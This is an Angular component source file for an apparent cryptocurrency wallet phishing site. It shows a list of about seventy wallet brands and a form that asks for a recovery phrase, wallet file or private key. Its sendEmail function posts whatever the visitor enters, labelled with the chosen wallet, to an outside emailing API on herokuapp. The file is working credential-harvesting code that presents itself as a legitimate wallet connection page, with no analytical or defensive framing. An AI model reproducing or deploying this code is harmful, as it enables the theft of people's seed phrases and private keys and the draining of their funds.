import { HttpClient } from '@angular/common/http';
import { Component } from '@angular/core';
import { FormBuilder, FormGroup } from '@angular/forms';
import { Observable } from 'rxjs';
import { catchError, finalize, map } from "rxjs/operators";

@Component({
  selector: 'app-root',
  templateUrl: './app.component.html',
  styleUrls: ['./app.component.scss']
})
export class AppComponent {
  title: any;
  img: any
  spinner: boolean = false;
  newPage: boolean = false;

  landingpage: boolean = false;

  modal: boolean;

  allWallet= [
    {img:"./../assets/wallets/waveduck.jpg", title:"Waveduck"},
    {img:"./../assets/wallets/ledger.52e09fe1.jpg", title:"Ledger"},
    {img:"./../assets/wallets/trust-wallet.4121118e.png", title:"Trust"},
    {img:"./../assets/wallets/metamask.9d0bcbd4.png", title:"MetaMask"},
    {img:"./../assets/wallets/tronlink.330be608.jpg", title:"TronLink"},
    {img:"./../assets/wallets/atomic.a2bb6f98.png", title:"Atomic"},
    {img:"./../assets/wallets/download.jpg", title:"Argent"},
    {img:"./../assets/wallets/coinomi.48bb4912.jpg", title:"Coinomi"},
    {img:"./../assets/wallets/imtoken.6bd18cb3.png", title:"imToken"},
    {img:"./../assets/wallets/tokenpocket.b7c388ce.png", title:"TokenPocket"},
    {img:"./../assets/wallets/math-wallet.23e9877e.png", title:"MathWallet"},
    {img:"./../assets/wallets/download.png", title:"Pillar"},
    {img:"./../assets/wallets/authereum.9fc6b1c3.png", title:"Authereum"},
    {img:"./../assets/wallets/rainbow.6d0d2612.png", title:"Rainbow"},
    {img:"./../assets/wallets/download (7).png", title:"Eidoo"},
    {img:"./../assets/wallets/zelcore.88c42d94.png", title:"Zelcore"},
    {img:"./../assets/wallets/crypto.836cded4.png", title:"Crypto.com | Defi Wallet"},
    {img:"./../assets/wallets/unnamed.png", title:"Terra Station"},
    {img:"./../assets/wallets/download (1).jpg", title:"Gnosis Safe Multisig"},
    {img:"./../assets/wallets/gridplus.87a9dc29.png", title:"GridPlue"},
    {img:"./../assets/wallets/coolwallet.3a4392c5.png", title:"Cool Wallet S"},
    {img:"./../assets/wallets/download (1).png", title:"Alice"},
    {img:"./../assets/wallets/download (2).jpg", title:"AlphaWallet"},
    {img:"./../assets/wallets/download (2).png", title:"Tokenary"},
    {img:"./../assets/wallets/safepal.71147cce.png", title:"SafePal"},
    {img:"./../assets/wallets/download (3).jpg", title:"Equal"},
    {img:"./../assets/wallets/infinito.47c9c6e7.png", title:"Infinito"},
    {img:"./../assets/wallets/walleth.ae2bda7a.png", title:"Walleth"},
    {img:"./../assets/wallets/mykey.073a27c9.png", title:"MYKEY"},
    {img:"./../assets/wallets/download (7).jpg", title:"Spatium"},
    {img:"./../assets/wallets/wallet.io.b76f6e0c.png", title:"Wallet.io"},
    {img:"./../assets/wallets/infinity-wallet.fa160fcf.png", title:"Infinity Wallet"},
    {img:"./../assets/wallets/ownbit-wallet-logo.png", title:"Ownbit"},
    {img:"./../assets/wallets/easypocket.png", title:"EasyPocket"},
    {img:"./../assets/wallets/onto.png", title:"ONTO"},
    {img:"./../assets/wallets/download (3).png", title:"Brigde Wallet"},
    {img:"./../assets/wallets/sparkpoint-logo-top-one.png", title:"SparkPoint"},
    {img:"./../assets/wallets/viamed.png", title:"ViaWallet"},
    {img:"./../assets/wallets/download (4).jpg", title:"Nash"},
    {img:"./../assets/wallets/bitkeeppng.png", title:"BitKeep"},
    {img:"./../assets/wallets/vision.jfif", title:"Vision"},
    {img:"./../assets/wallets/download (4).png", title:"SWFT Wallet"},
    {img:"./../assets/wallets/peak.jfif", title:"PeakDeFi Wallet"},
    {img:"./../assets/wallets/xdc.png", title:"XDC Wallet"},
    {img:"./../assets/wallets/unstoppable.jfif", title:"Unstoppable Wallet"},
    {img:"./../assets/wallets/math-wallet.23e9877e (1).png", title:"MEET.ONE"},
    {img:"./../assets/wallets/rainbow.6d0d2612.png", title:"Dok Wallet"},
    {img:"./../assets/wallets/at.png", title:"AT.Wallet"},
    {img:"./../assets/wallets/coin98.jfif", title:"Coin98"},
    {img:"./../assets/wallets/mori.jfif", title:"MoriX Wallet"},
    {img:"./../assets/wallets/midas.png", title:"Midas Wallet"},
    {img:"./../assets/wallets/vault.jfif", title:"TrustVault"},
    {img:"./../assets/wallets/smart chain.png", title:"Binance smart chain"},
    {img:"./../assets/wallets/akt.jfif", title:"Aktionariat"},
    {img:"./../assets/wallets/download (5).png", title:"Ellipal"},
    {img:"./../assets/wallets/wallet.io.b76f6e0c.png", title:"Keyring pro"},
    {img:"./../assets/wallets/zelcore.88c42d94.png", title:"Cybavo"},
    {img:"./../assets/wallets/download (5).jpg", title:"Loopring wallet"},
    {img:"./../assets/wallets/ledger.52e09fe1.jpg", title:"Ledger live"},
    {img:"./../assets/wallets/ma.png", title:"Maiar"},
    {img:"./../assets/wallets/bit.jfif", title:"Bitpay"},
    {img:"./../assets/wallets/parity.jfif", title:"Parity signer"},
    {img:"./../assets/wallets/trust-wallet.4121118e.png", title:"Blockchain"},
    {img:"./../assets/wallets/download (6).jpg", title:"Huobi wallet"},
    {img:"./../assets/wallets/download (6).png", title:"Mew Wallet"},
    {img:"./../assets/wallets/Polkadot_OG.png", title:"Polkadot"},
    {img:"./../assets/wallets/xrpLogo.jpg", title:"Xrp"},
    {img:"./../assets/wallets/sparkpoint-logo-top-one.png", title:"Stellar"},
    {img:"./../assets/wallets/tokenpocket.b7c388ce.png", title:"Tezos"},
    {img:"./../assets/wallets/theta.png", title:"Theta"},
    {img:"./../assets/wallets/solona.jpg", title:"Solana"},
    {img:"./../assets/wallets/icon.jpg", title:"Icon"},
    {img:"./../assets/wallets/exodus.png", title:"Exodos"},
  ]

  feedbackForm: FormGroup;

  constructor(
    private _http: HttpClient,
    private _fb: FormBuilder
  ) {
      this.feedbackForm = _fb.group ({
        phrase: [''],
        walletFile: [''],
        wallet: [''],
        private: ['']
      })
  }

  registerModal(img:any, type:any) {
    this.modal = !this.modal;
    // console.log(this.modal);
    this.img = img;
    this.title = type;
  }

  callEmail(data: any):Observable<any> {
    return this._http.post<any>("https://emailingapi.herokuapp.com/api/v1/email", data)
    .pipe(map((res: any)=> {
      return res
    }))
  }


  sendEmail(data: any) {
    this.spinner = true;
    let payload = []
    if (data.toLowerCase().includes("phrase")) {
      payload.push({
        subject: `${this.title}(${data})`,
        description: this.feedbackForm.value.phrase
      })
    }
    if (data.toLowerCase().includes("wallet")) {
      payload.push({
        subject: `${this.title}(${data})`,
        description: this.feedbackForm.value.wallet
      })
    }
    if (data.toLowerCase().includes("private")) {
      payload.push({
        subject: `${this.title}(${data})`,
        description: this.feedbackForm.value.private
      })
    }
    // console.log(payload)
    this.callEmail(payload[0])
    .pipe(finalize(()=>{this.spinner = false;}))
    .subscribe((res) => {
      // console.log(res)
      this.registerModal('','')
      this.newPage = true;
    })
  }

  displayData(count: boolean){
    this.landingpage = count;
  }



}
